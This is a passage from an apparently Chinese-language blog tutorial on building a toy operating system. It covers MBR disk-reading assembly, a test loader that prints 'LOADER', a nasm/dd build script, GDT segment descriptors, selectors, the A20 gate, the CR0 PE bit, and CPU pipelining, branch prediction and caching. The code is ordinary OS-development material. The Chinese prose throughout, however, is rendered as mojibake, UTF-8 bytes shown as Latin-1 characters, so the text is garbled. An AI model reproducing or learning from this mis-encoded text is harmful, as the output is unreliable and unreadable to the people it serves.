;lba ç¬¬ 24-27ä½ã€‚è®¾ç½® 7-4 ä½ä¸º 1110 ï¼Œè¡¨ç¤º lba æ¨¡å¼            <br><br>mov dx,0x1f7<br>mov al,0x20<br>out dx,al                         ;å†™å…¥è¯»å–å‘½ä»¤<br><br>.not_ready:                           ;è¿˜æ˜¯0x1f7ç«¯å£<br>nop<br>in al,dx<br>and al,0x88                       ;ç¬¬ 4 ä½ä¸º 1 è¡¨ç¤ºç¡¬ç›˜æ§åˆ¶å™¨å·²å‡†å¤‡å¥½æ•°æ®ä¼ è¾“  ç¬¬ 7 ä½ä¸º 1 è¡¨ç¤ºç¡¬ç›˜å¿™<br>cmp al,0x08 <br>jnz .not_ready                    ;ç›´åˆ°å‡†å¤‡å¥½ä¸ºæ­¢<br><br>mov ax,di                         <br>mov dx,256<br>mul dx<br>mov cx,ax                         ;di ä¸ºè¦è¯»å–çš„æ‰‡åŒºæ•°ï¼Œä¸€ä¸ªæ‰‡åŒºæœ‰512å­—èŠ‚æ¯æ¬¡è¯»å…¥ä¸€ä¸ªå­—116å…±éœ€ di*512/2æ¬¡ï¼Œæ‰€ä»¥ di*<br>mov dx,0x1f0                      <br><br>.go_on_read:<br>in ax,dx<br>mov [bx],ax<br>add bx,2<br>loop .go_on_read<br>ret<br><br> times 510-($-$$) db 0<br>db 0x55,0xaa<br></code></pre></td></tr></table></figure><p>å½“ç„¶æ­¤æ—¶æ‰‡åŒº2é‡Œé¢ä¸€ç‚¹æ•°æ®éƒ½æ²¡æœ‰ï¼Œæˆ‘ä»¬å¯ä»¥éšä¾¿å†™ä¸€ç‚¹loader</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs assembly">%include &quot;boot.inc&quot;<br>SECTION LOADER vstart=LOADER_BASE_ADDR<br>mov ax,cs<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov sp,LOADER_BASE_ADDR<br>mov ax,0xb800<br>mov gs,ax<br><br>mov ax,0x600<br>mov bx,0x700<br>mov cx,0<br>mov dx,0x184f<br>int 0x10<br><br>mov byte [gs:0x00],&#x27;L&#x27;<br>mov byte [gs:0x01],0xa4  <br><br>mov byte [gs:0x02],&#x27;O&#x27;<br>mov byte [gs:0x03],0xa4<br><br>mov byte [gs:0x04],&#x27;A&#x27;<br>mov byte [gs:0x05],0xa4<br><br>mov byte [gs:0x06],&#x27;D&#x27;<br>mov byte [gs:0x07],0xa4<br><br>mov byte [gs:0x08],&#x27;E&#x27;<br>mov byte [gs:0x09],0xa4<br><br>mov byte [gs:0x0a],&#x27;R&#x27;<br>mov byte [gs:0x0b],0xa4<br><br>jmp $<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘åddè¿›ç£ç›˜çš„æ‰‡åŒº2ï¼Œæ‰€ä»¥pack.hä¹Ÿå¾—æ”¹ä¸€æ”¹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/bin/bash</span><br>nasm -o ./mbr.bin ./mbr.S<br>nasm -o ./loader.bin ./load.S<br>./bochs/bin/bximage <span class="hljs-attribute">-mode</span>=create <span class="hljs-attribute">-hd</span>=60M <span class="hljs-attribute">-imgmode</span>=<span class="hljs-string">&quot;flat&quot;</span> -q ./img.img<br>dd <span class="hljs-attribute">if</span>=./mbr.bin \<br>        <span class="hljs-attribute">of</span>=./img.img \<br>        <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=1 <span class="hljs-attribute">conv</span>=notrunc<br>dd <span class="hljs-attribute">if</span>=./loader.bin \<br>        <span class="hljs-attribute">of</span>=./img.img \<br>        <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=1 <span class="hljs-attribute">seek</span>=2 <span class="hljs-attribute">conv</span>=notrunc<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥æ„‰å¿«çš„è·³åˆ°0x900æ‰§è¡Œloaderäº†</p><p><img src="/img/OS/8.png" alt="img"></p><p>ä½†æ˜¯è¿™ä¸ªloaderå¹¶æ²¡æœ‰ä»»ä½•æ„ä¹‰ï¼Œå› ä¸ºä»–æ˜¯åœ¨å®æ¨¡å¼ä¸‹è¿è¡Œçš„ï¼Œåªæ˜¯ä¸ºäº†æµ‹è¯•MBRçš„åŠŸèƒ½æ€§ã€‚</p><h1 id="0x2-ä¿æŠ¤æ¨¡å¼"><a href="#0x2-ä¿æŠ¤æ¨¡å¼" class="headerlink" title="0x2:ä¿æŠ¤æ¨¡å¼"></a>0x2:ä¿æŠ¤æ¨¡å¼</h1><h2 id="æ®µæè¿°ç¬¦ï¼ˆSegment-Descriptorï¼‰"><a href="#æ®µæè¿°ç¬¦ï¼ˆSegment-Descriptorï¼‰" class="headerlink" title="æ®µæè¿°ç¬¦ï¼ˆSegment Descriptorï¼‰"></a>æ®µæè¿°ç¬¦ï¼ˆSegment Descriptorï¼‰</h2><p>éšç€æ—¶é—´çš„æ¨ç§»ï¼Œ8086è¿›åŒ–æˆäº†80386ï¼Œåœ°å€æ€»çº¿ä¹Ÿä»16ä½å˜æˆ32ä½ï¼Œbutï¼Œæ®µå¯„å­˜å™¨å´è¿˜æ˜¯16ä½ä»æœªå˜è¿‡</p><p>è¿™æ˜¯å› ä¸ºå…³äºæ®µçš„ä¿¡æ¯è¢«å­˜æ”¾åœ¨äº†å†…å­˜ä¸­ä¸€å—å«åš<strong>æ®µæè¿°ç¬¦</strong>çš„åœ°æ–¹</p><p><img src="/img/OS/9.png" alt="img"></p><p>æ®µæè¿°ç¬¦é•¿8å­—èŠ‚ï¼Œ64ä½ï¼Œé‡Œé¢çš„å„ä¸ªä½çš„å…·ä½“å«ä¹‰å¦‚ä¸‹</p><ul><li>0-15ï¼šæ®µç•Œé™ä½16ä½</li><li>16-31ï¼šæ®µåŸºå€ä½16ä½</li><li>32-39ï¼šæ®µåŸºå€ä¸­8ä½</li><li>40-43ï¼štype æŒ‡å®šæœ¬æè¿°ç¬¦çš„ç±»å‹ï¼Œç”¨äºè¡¨ç¤ºå†…å­˜æ®µå’Œé—¨çš„å­ç±»å‹ã€‚å›¾å‡ºè‡ªã€Šæ“ä½œç³»ç»ŸçœŸè±¡è¿˜åŸã€‹</li><li><img src="/img/OS/10.png" alt="img"></li><li>44ï¼šS 0&#x2F;1 â€”&gt; ç³»ç»Ÿæ®µ&#x2F;æ•°æ®æ®µ</li><li>45-46ï¼šDPL ï¼Œå³<code>Descriptor Privilege Level</code>ï¼Œæè¿°ç¬¦ç‰¹æƒçº§ï¼Œåˆ†0ã€1ã€2ã€3ï¼Œæ•°å­—è¶Šå°ï¼Œç‰¹æƒçº§è¶Šå¤§</li><li>47ï¼šP <code>Present</code>ï¼Œå³æ®µæ˜¯å¦å­˜åœ¨ 0&#x2F;1 â€”&gt; ä¸å­˜åœ¨&#x2F;å­˜åœ¨</li><li>48-51ï¼šæ®µç•Œé™é«˜4ä½</li><li>52ï¼šAVLï¼Œå³<code>AVaiLable</code>ï¼Œå¯ç”¨çš„</li><li>53ï¼šLï¼Œæ˜¯å¦ä¸º64ä½ä»£ç æ®µ 0&#x2F;1 â€”&gt; å¦&#x2F;æ˜¯</li><li>54ï¼šD&#x2F;Bï¼Œè¡¨ç¤ºæœ‰æ•ˆåœ°å€ï¼ˆæ®µå†…åç§»åœ°å€ï¼‰å’Œæ“ä½œæ•°å¤§å° 0&#x2F;1 â€”&gt; 16ä½&#x2F;32ä½</li><li>55ï¼šGï¼Œç²’åº¦ 0&#x2F;1 â€”&gt; 1B&#x2F; 4KB</li><li>56-63ï¼šæ®µåŸºå€é«˜8ä½</li></ul><p>ä½ è¦é—®ğŸ‘´ä¸ºä»€ä¹ˆæ®µç•Œé™å’Œæ®µåŸºå€ä¼šè¢«æ‹†æˆè¿™ä¸ªJBæ ·å­ï¼ŒğŸ‘´åªèƒ½è¯´å…¼å®¹ã€å…¼å®¹ã€è¿˜æ˜¯ç‰›é­”çš„å…¼å®¹</p><h2 id="å…¨å±€æè¿°ç¬¦è¡¨GDTï¼ˆGlobal-Descriptor-Tableï¼‰"><a href="#å…¨å±€æè¿°ç¬¦è¡¨GDTï¼ˆGlobal-Descriptor-Tableï¼‰" class="headerlink" title="å…¨å±€æè¿°ç¬¦è¡¨GDTï¼ˆGlobal Descriptor Tableï¼‰"></a>å…¨å±€æè¿°ç¬¦è¡¨GDTï¼ˆGlobal Descriptor Tableï¼‰</h2><p>ä¸€ä¸ªæ®µæè¿°ç¬¦åªèƒ½æè¿°ä¸€æ®µå†…å­˜ï¼Œbutå†…å­˜è¢«åˆ†æˆè®¸å¤šæ®µæ˜¯æ— æ³•é¿å…çš„ï¼Œæ‰€ä»¥è¿™æ—¶å€™å…¨å±€æè¿°ç¬¦è¡¨å°±å‡ºç°äº†ï¼Œä¸€ä¸ªå†…å­˜ä¸­ä¸“é—¨ç”¨æ¥å­˜æ”¾æ®µæè¿°ç¬¦çš„åœ°æ–¹ã€‚</p><p>ç¨‹åºéƒ½å¯ä»¥åœ¨GDTä¸­å®šä¹‰è‡ªå·±çš„æ®µæè¿°ç¬¦ï¼ŒCPUé€šè¿‡ä¸€ä¸ªä¸“é—¨æŒ‡å‘GDTçš„å¯„å­˜å™¨<code>GDTR</code>å’Œä¸€ä¸ªâ€œä¸‹æ ‡â€ï¼Œä¹Ÿå°±æ˜¯<code>selector</code>é€‰æ‹©å­ï¼Œåœ¨GDTä¸­ç²¾å‡†çš„æ‰¾åˆ°è‡ªå·±éœ€è¦çš„æ®µæè¿°ç¬¦</p><h3 id="GDTR"><a href="#GDTR" class="headerlink" title="GDTR"></a>GDTR</h3><p>48ä½å¯„å­˜å™¨ï¼Œä¸“é—¨ç”¨æ¥å­˜å‚¨GDTçš„å†…å­˜åœ°å€å’Œå¤§å°,ä¸‹å›¾å‡ºè‡ªã€Šæ“ä½œç³»ç»ŸçœŸè±¡è¿˜åŸã€‹</p><p><img src="/img/OS/11.png" alt="img"></p><p>å‰16ä½æ˜¯ç•Œé™å€¼ï¼Œ2^16 &#x3D; 65536ï¼Œæ‰€ä»¥å‰16ä½çš„<code>max value</code> &#x3D; 65536 -1 &#x3D; 0xffff</p><p><code>and</code>ä¸€ä¸ªæ®µæè¿°ç¬¦é•¿8å­—èŠ‚ï¼Œæ‰€ä»¥ä¸€ä¸ª<code>GDT</code>æœ€å¤šå­˜å‚¨8192ä¸ªæ®µæè¿°ç¬¦</p><p><strong>lgdt</strong>:å¯¹GDTRç‰¹æ”»æŒ‡ä»¤ï¼Œå…·ä½“æ“ä½œä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lgdt 48ä½å†…å­˜æ•°æ®<br></code></pre></td></tr></table></figure><h3 id="selector"><a href="#selector" class="headerlink" title="selector"></a>selector</h3><p>é€‰æ‹©å­æ˜¯16ä½ï¼Œä¸‹å›¾å‡ºè‡ªã€Šæ“ä½œç³»ç»ŸçœŸè±¡è¿˜åŸã€‹</p><p><img src="/img/OS/12.png" alt="img"></p><p>0-1ä½ï¼šRPLï¼Œè¯·æ±‚ç‰¹æƒçº§ï¼Œ00ä¸º0ï¼Œ11ä¸º3</p><p>2ä½ï¼šTIï¼Œå³<code>Table Indicator</code>ï¼Œ0ä¸º<code>GDT</code>ä¸­ç´¢å¼•æè¿°ç¬¦ï¼Œ1ä¸º<code>LDT</code>ï¼ˆæœ‰å…¨å±€å½“ç„¶ä¹Ÿä¼šæœ‰å±€éƒ¨ï¼Œ<code>Local Descriptor Table</code>ï¼Œå±€éƒ¨æè¿°ç¬¦è¡¨ï¼‰ä¸­ç´¢å¼•æè¿°è¡¨</p><p>é«˜13ä½æ˜¯ç´¢å¼•å€¼ï¼Œ2^13 &#x3D; 8192ï¼Œå³æœ€å¤šèƒ½æœ‰8192ä¸ªæ®µæè¿°ç¬¦ï¼Œå’Œä¸Šæ–‡ç›¸ç¬¦</p><p><strong>PSï¼šGDTä¸­ç¬¬0ä¸ªç´¢å¼•å€¼ä¸å¯ç”¨ï¼Œå› ä¸ºselectoræœªåˆå§‹åŒ–æ—¶ä¸º0</strong></p><p>è‡³äº<code>LDT</code>ï¼Œå’Œ<code>GD</code>Tç±»ä¼¼ï¼Œå°±ä¸å†èµ˜è¿°</p><h2 id="æ‰“å¼€A20åœ°å€çº¿"><a href="#æ‰“å¼€A20åœ°å€çº¿" class="headerlink" title="æ‰“å¼€A20åœ°å€çº¿"></a>æ‰“å¼€A20åœ°å€çº¿</h2><p>å…ˆæ¥è¯´è¯´8086çš„åœ°å€å›ç»•</p><h3 id="8086åœ°å€å›ç»•"><a href="#8086åœ°å€å›ç»•" class="headerlink" title="8086åœ°å€å›ç»•"></a>8086åœ°å€å›ç»•</h3><p>8086çš„åœ°å€æ€»çº¿æ˜¯20ä½çš„ï¼Œæ‰€ä»¥æœ‰A0-A19è¿™20æ ¹åœ°å€çº¿</p><p>åœ¨å®æ¨¡å¼ä¸‹ï¼Œé‡‡ç”¨æ®µåŸºå€*16+åç§»çš„å¯»å€æ–¹å¼ï¼Œä¸éš¾å‘ç°ï¼Œå½“0xffffï¼š0xffffæ—¶ï¼Œæ­¤æ—¶çš„é€»è¾‘åœ°å€æ˜¯0x10ffefï¼Œä½†æ˜¯ï¼Œ20ä½åœ°å€æ€»çº¿çš„æœ€å¤§å€¼æ˜¯0xfffffï¼Œåœ¨é€»è¾‘ä¸Šè¿™æ˜¯æ­£ç¡®çš„ï¼Œä½†åœ¨ç‰©ç†å†…å­˜ä¸­æ²¡æœ‰ç›¸åº”çš„åœ°å€ã€‚ä¸ºäº†é¿å…è¿™ä¸ªbugï¼Œæ‰€ä»¥8086é‡‡å–çš„ç­–ç•¥ä¾¿æ˜¯å°†é€»è¾‘åœ°å€å¯¹0x100000å–æ¨¡ï¼Œè¿™å°±æ˜¯8086çš„åœ°å€å›ç»•</p><h3 id="A20GATE"><a href="#A20GATE" class="headerlink" title="A20GATE"></a>A20GATE</h3><p>åˆ°äº†80286è¿™ä¸ªæ‹¥æœ‰24ä½åœ°å€æ€»çº¿çš„CPUï¼Œä½†æ˜¯<code>intel</code>ä¸ºäº†å…¼å®¹è€ƒè™‘ï¼Œåœ¨å®æ¨¡å¼ä¸‹ï¼Œä»ç„¶åªå¼€å¯A0-A19è¿™ä½20ä½åœ°å€çº¿ï¼Œå¹¶é‡‡ç”¨8086åœ°å€å›ç»•ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦çªç ´A20åœ°å€çº¿ï¼Œè¿™å°±æ˜¯è¯´çš„æ‰“å¼€<strong>A20GATE</strong></p><p>å…¶å®æ‰“å¼€A20å¾ˆç®€å•ï¼Œåªè¦æŠŠ0x92ç«¯å£çš„ç¬¬1ä½ï¼ˆæœ€ä½ä½æ˜¯ç¬¬0ä½ï¼‰ç½®1ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">in al, 0x92<br>or al, 0000_0010b<br>out 0x92, al<br></code></pre></td></tr></table></figure><h2 id="CR0å¯„å­˜å™¨çš„PEä½"><a href="#CR0å¯„å­˜å™¨çš„PEä½" class="headerlink" title="CR0å¯„å­˜å™¨çš„PEä½"></a>CR0å¯„å­˜å™¨çš„PEä½</h2><p>å…ˆäº†è§£ä¸€ä¸‹CR0-CR3å¯„å­˜å™¨</p><h3 id="æ§åˆ¶å¯„å­˜å™¨"><a href="#æ§åˆ¶å¯„å­˜å™¨" class="headerlink" title="æ§åˆ¶å¯„å­˜å™¨"></a>æ§åˆ¶å¯„å­˜å™¨</h3><p>æ§åˆ¶å¯„å­˜å™¨ç”¨äºæ§åˆ¶å’Œç¡®å®šå¤„ç†å™¨çš„æ“ä½œæ¨¡å¼ä»¥åŠå½“å‰æ‰§è¡Œä»»åŠ¡çš„ç‰¹æ€§ï¼Œåœ¨80386ä¸­æœ‰4ä¸ªï¼Œåˆ†åˆ«ä¸ºCR0ã€CR1ã€CR2ã€CR3ï¼Œå…¶ä¸­CR1è¢«ä¿ç•™ï¼Œä¸ºåç»­å¼€å‘åšå‡†å¤‡ã€‚</p><p>CR0åŒ…æ‹¬æŒ‡ç¤ºå¤„ç†å™¨å·¥ä½œæ–¹å¼çš„æ§åˆ¶ä½ï¼ŒåŒ…å«å¯ç”¨å’Œç¦æ­¢åˆ†é¡µç®¡ç†æœºåˆ¶çš„æ§åˆ¶ä½ï¼ŒåŒ…å«æ§åˆ¶æµ®ç‚¹åå¤„ç†å™¨æ“ä½œçš„æ§åˆ¶ä½ã€‚CR2åŠCR3ç”±åˆ†é¡µç®¡ç†æœºåˆ¶ä½¿ç”¨ã€‚CR0ä¸­çš„ä½5â€”ä½30åŠCR3ä¸­çš„ä½0è‡³ä½11æ˜¯ä¿ç•™ä½ï¼Œè¿™äº›ä½ä¸èƒ½æ˜¯éšæ„å€¼ï¼Œå¿…é¡»ä¸º0ã€‚</p><p>è¯¦ç»†ä»‹ç»ä¸€ä¸‹CR0å¯„å­˜å™¨</p><h3 id="CR0"><a href="#CR0" class="headerlink" title="CR0"></a>CR0</h3><p>ä¸‹ä¸¤å›¾å‡ºè‡ªã€Šæ“ä½œç³»ç»ŸçœŸè±¡è¿˜åŸã€‹</p><p><img src="/img/OS/13.png" alt="img"></p><p><img src="/img/OS/14.png" alt="img"></p><p>ç¬¬0ä½ï¼šPEï¼Œå³<code>Protection Enable</code>ï¼Œä¸º0æ—¶æ˜¯å®æ¨¡å¼ï¼Œä¸º1æ—¶æ˜¯ä¿æŠ¤æ¨¡å¼ï¼Œæ‰€ä»¥PEä¾¿æ˜¯æˆ‘ä»¬çš„ç›®æ ‡ï¼Œå°†ä»–ç½®1ä¹Ÿå¾ˆç®€å•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,cr0<br>or eax,0x00000001<br>mov cr0,eax<br></code></pre></td></tr></table></figure><p>é¡ºå¸¦æä¸€å˜´ï¼Œåªæœ‰CR0çš„æœ€é«˜ä½PGä¸º1ï¼Œå¼€å¯åˆ†é¡µæ—¶ï¼ŒCR3æ‰ä¼šè¢«å¯ç”¨</p><h2 id="about-CPU"><a href="#about-CPU" class="headerlink" title="about CPU"></a>about CPU</h2><h3 id="æµæ°´çº¿"><a href="#æµæ°´çº¿" class="headerlink" title="æµæ°´çº¿"></a>æµæ°´çº¿</h3><p>è™½ç„¶æ‰§è¡Œå•å…ƒEUæ˜¯CPUæ‰§è¡ŒæŒ‡ä»¤çš„å”¯ä¸€éƒ¨ä»¶ï¼Œä½†æ˜¯CPU çš„æŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹åˆ†ä¸ºå–æŒ‡ä»¤ã€è¯‘ç ã€æ‰§è¡Œä¸‰ä¸ªæ­¥éª¤ã€‚æ¯ä¸ªæ­¥éª¤éƒ½æ˜¯ç‹¬ç«‹æ‰§è¡Œçš„ï¼Œ CPU å¯ä»¥ä¸€è¾¹æ‰§è¡ŒæŒ‡ä»¤ï¼Œä¸€è¾¹å–æŒ‡ä»¤ï¼Œä¸€è¾¹è¯‘ç ã€‚CPUæ˜¯åªèƒ½ä¸€æ¬¡å¤„ç†ä¸€ä¸ªæŒ‡ä»¤ï¼Œä½†æ˜¯ä¹Ÿå¦¹è¯´ä¸èƒ½å¹²çš„åˆ«çš„äº‹å•ŠğŸ˜‹ã€‚è¿™æ ·å°±ä½¿æ•ˆç‡å¾—åˆ°æå¤§çš„æå‡ã€‚</p><h4 id="jmpæ¸…ç©º"><a href="#jmpæ¸…ç©º" class="headerlink" title="jmpæ¸…ç©º"></a>jmpæ¸…ç©º</h4><p>CPU æ˜¯æŒ‰ç…§ç¨‹åºä¸­æŒ‡ä»¤é¡ºåºæ¥å¡«å……æµæ°´çº¿çš„ï¼Œå¤§å¤šæ˜¯æƒ…å†µä¸‹å½“å‰æŒ‡ä»¤å’Œä¸‹ä¸€æ¡æŒ‡ä»¤åœ¨ç©ºé—´ä¸Šæ˜¯æŒ¨ç€çš„ã€‚ä½†å¦‚æœå½“å‰æ‰§è¡Œçš„æŒ‡ä»¤æ˜¯jmp ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤å·²ç»è¢«é€ä¸Šæµæ°´çº¿è¯‘ç äº†ï¼Œç¬¬ä¸‰æ¡æŒ‡ä»¤å·²ç»è¢«é€ä¸Šæµæ°´çº¿å–æŒ‡ã€‚butå› ä¸º<code>cs:ip</code>å·²ç»è·³åˆ°ä¸çŸ¥é“å“ªå»äº†ï¼Œæ‰€ä»¥ CPU åœ¨é‡åˆ°æ— æ¡ä»¶è½¬ç§»æŒ‡ä»¤ jmp æ—¶ï¼Œä¼šæ¸…ç©ºæµæ°´çº¿ã€‚</p><h3 id="åˆ†æ”¯é¢„æµ‹"><a href="#åˆ†æ”¯é¢„æµ‹" class="headerlink" title="åˆ†æ”¯é¢„æµ‹"></a>åˆ†æ”¯é¢„æµ‹</h3><p>éšç€æµæ°´çº¿è€Œæ¥çš„ä¸€ä¸ªé—®é¢˜ä¾¿æ˜¯ï¼Œå¦‚æœCPUé‡åˆ°ä¸€ä¸ªæ¡ä»¶è·³è½¬è¯­å¥ï¼Œå‡è®¾ä¸¤æ¡è·¯åˆ†åˆ«æ—¶Aã€Bï¼Œé‚£ä¹ˆCPUåœ¨è¿˜æœªæ‰§è¡Œåˆ¤æ–­è¯­å¥çš„æ—¶å€™ï¼Œæ˜¯å¦‚ä½•é€‰æ‹©Aæˆ–Bè¿›å…¥æµæ°´çº¿çš„ï¼Ÿ</p><p>æœ€ç®€å•çš„æ–¹æ³•æ˜¯ 2 ä½é¢„æµ‹æ³•ã€‚ç”¨ 2 ä½ bit çš„è®¡æ•°å™¨æ¥è®°å½•è·³è½¬çŠ¶æ€ï¼Œæ¯è·³è½¬ä¸€æ¬¡åŠ  1ï¼Œå¦‚æœæœªè·³è½¬å°±å‡ 1ã€‚å½“é‡åˆ°è·³è½¬æŒ‡ä»¤æ—¶ï¼Œå¦‚æœè®¡æ•°å™¨çš„å€¼å¤§äº 1 åˆ™è·³è½¬ï¼Œå¦‚æœå°äºç­‰äº 1 åˆ™ä¸è·³ã€‚è¿™åŸºäºçš„åŸç†æ˜¯å½“ä¸€ä»¶äº‹æƒ…å‘ç”Ÿæ—¶ï¼Œæœ‰å¾ˆå¤§æ¦‚ç‡ä¸‹ä¸€æ¬¡è¿˜ä¼šå‘ç”Ÿã€‚</p><p>åŒæ—¶ï¼Œintelæ¶æ„çš„CPUä¸­å­˜åœ¨åˆ†æ”¯ç›®æ ‡ç¼“å†²å™¨ï¼ˆ<code>Branch Target Buffer</code>,BTBï¼‰ï¼Œä¼šå°†åˆ†æ”¯æŒ‡ä»¤çš„åœ°å€å’Œè·³è½¬ä¿¡æ¯å­˜æ”¾åœ¨å…¶ä¸­ï¼ŒCPUåœ¨ä¸‹ä¸€æ¬¡é‡åˆ°åˆ†æ”¯æŒ‡ä»¤æ—¶ï¼Œä¼šåœ¨BTBå¯»æ‰¾ç›¸åŒåœ°å€çš„æŒ‡ä»¤ï¼Œå‚ç…§å…¶ä¸­çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œé€‰æ‹©å°†å“ªä¸€ä¸ªåˆ†æ”¯è½½å…¥æµæ°´çº¿ã€‚å¦‚æœæœªæ‰¾åˆ°ç›¸åŒåœ°å€ï¼Œä¼šä½¿ç”¨<code>Static Predictor</code>ï¼Œå³é™æ€é¢„æµ‹ï¼Œè¿™æ˜¯åŸºäºå¤§é‡ä»£ç çš„å…±åŒç‰¹å¾æ€»ç»“çš„ã€‚æ¯”å¦‚å¾ªç¯ç»“æ„ä½“ä¸€èˆ¬éƒ½åœ¨ç»“æŸè·³è½¬æŒ‡ä»¤çš„ä¸Šæ–¹ã€‚</p><p>å½“ç„¶åŠ è½½é”™è¯¯çš„åˆ†æ”¯æŒ‡ä»¤ä¹Ÿæ²¡å…³ç³»ï¼Œåªè¦åœ¨CPUæ‰§è¡Œå‰åˆ¶æ­¢å°±è¡Œäº†ï¼Œè™½ç„¶æ¸…ç©ºæµæ°´çº¿è£…è½½æ­£ç¡®åˆ†æ”¯çš„èŠ±é”€æŒºå¤§çš„ğŸ˜“</p><h3 id="ä¹±åºæ‰§è¡Œ"><a href="#ä¹±åºæ‰§è¡Œ" class="headerlink" title="ä¹±åºæ‰§è¡Œ"></a>ä¹±åºæ‰§è¡Œ</h3><p>å°±æ˜¯ CPU ä¸­è¿è¡Œçš„æŒ‡ä»¤å¹¶ä¸æŒ‰ç…§ä»£ç ä¸­çš„é¡ºåºæ‰§è¡Œï¼Œè€Œæ˜¯æŒ‰ç…§ä¸€å®šçš„ç­–ç•¥æ‰“ä¹±é¡ºåºæ‰§è¡Œï¼Œä¹Ÿè®¸åé¢çš„æŒ‡ä»¤å…ˆæ‰§è¡Œï¼Œå½“ç„¶ï¼Œå¾—ä¿è¯æŒ‡ä»¤ä¹‹é—´ä¸å…·å¤‡ç›¸å…³æ€§ ã€‚</p><p>æ¯”å¦‚ä¸‹é¢çš„ä¾‹å­ï¼Œç¬¬ä¸€ä¸ªæŒ‡ä»¤éœ€è¦å»å†…å­˜ä¸­å¯»æ‰¾å€¼ï¼Œè€Œadd ebxåªéœ€è¦ç®€å•çš„åŠ æ³•æ“ä½œå°±è¡Œäº†ï¼Œæ‰€ä»¥CPUå°±ä¼šåœ¨æŒ‡ä»¤1è®¿é—®å†…å­˜çš„ç­‰å¾…ä¸­æ‰§è¡ŒæŒ‡ä»¤2.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax, [0xfff00]<br>add ebx, 1<br></code></pre></td></tr></table></figure><h3 id="ç¼“å­˜"><a href="#ç¼“å­˜" class="headerlink" title="ç¼“å­˜"></a>ç¼“å­˜</h3><p> ç¼“å­˜æ˜¯ 20 ä¸–çºªæœ€å¤§çš„å‘æ˜ï¼Œå…¶åŸç†æ˜¯ç”¨ä¸€äº›å­˜å–é€Ÿåº¦è¾ƒå¿«çš„å­˜å‚¨è®¾å¤‡ä½œä¸ºæ•°æ®ç¼“å†²åŒºï¼Œé¿å…é¢‘ç¹è®¿é—®é€Ÿåº¦è¾ƒæ…¢çš„ä½é€Ÿå­˜å‚¨è®¾å¤‡ï¼Œå½’æ ¹ç»“åº•çš„åŸå› æ˜¯ä½é€Ÿå­˜å‚¨è®¾å¤‡æ˜¯æ•´ä¸ªç³»ç»Ÿçš„ç“¶é¢ˆï¼Œç¼“å­˜ç”¨æ¥ç¼“è§£â€œç“¶é¢ˆè®¾å¤‡â€çš„å‹åŠ›ï¼ˆæ‘˜è‡ªã€Šæ“ä½œç³»ç»ŸçœŸè±¡è¿˜åŸã€‹ï¼‰ã€‚éƒ½çŸ¥é“æœ¨æ¡¶åŸç†ï¼Œå’Œç¡¬ç›˜ç›¸æ¯”ï¼Œå†…å­˜<code>DRAM</code>çš„é€Ÿåº¦å·²ç»å¤Ÿå¿«äº†ï¼Œå´è¿˜æ˜¯è¿<code>CPU</code>çš„å°¾æ°”éƒ½åƒä¸åˆ°ã€‚æ‰€ä»¥ï¼Œå†…å­˜8è¡Œï¼Œå°±å‡ºç°äº†ä¸‰çº§ç¼“å­˜L1ã€L2ã€L3ï¼ˆ<code>SRAM</code>ï¼Œé™æ€éšæœºè®¿é—®å‚¨å­˜å™¨ï¼ŒæœŸå¾…èƒ½åœ¨amdçš„ä¸‰ç¼“é‡Œåœ¨è£…ç³»ç»Ÿçš„é‚£å¤©ğŸ˜šï¼‰ã€‚å¯„å­˜å™¨å’Œ<code>SRAM</code>åœ¨é€Ÿåº¦ä¸Šæ˜¯åŒä¸€çº§åˆ«çš„ä¸œè¥¿ï¼Œéƒ½æ˜¯ç”¨ç›¸åŒçš„å­˜å‚¨ç”µè·¯å®ç°çš„ï¼Œç”¨çš„éƒ½æ˜¯è§¦å‘å™¨ï¼Œé€Ÿåº¦å¿«çš„é£èµ· ã€‚</p><p> æ¯”å¦‚å½“å¾ªç¯æ‰§è¡Œä¸€æ®µcodeæ—¶ï¼ŒçŸ­æ—¶é—´å†…è¿™å—å†…å­˜å°†è¢«é«˜é¢‘ç‡è®¿é—®ï¼Œå¦‚æœå°†è¿™å—codeæ”¾åˆ°ä¸‰ç¼“é‡Œï¼Œå°±èƒ½æå¤§çš„æé«˜ç¨‹åºè¿è¡Œæ•ˆç‡ã€‚</p><h2 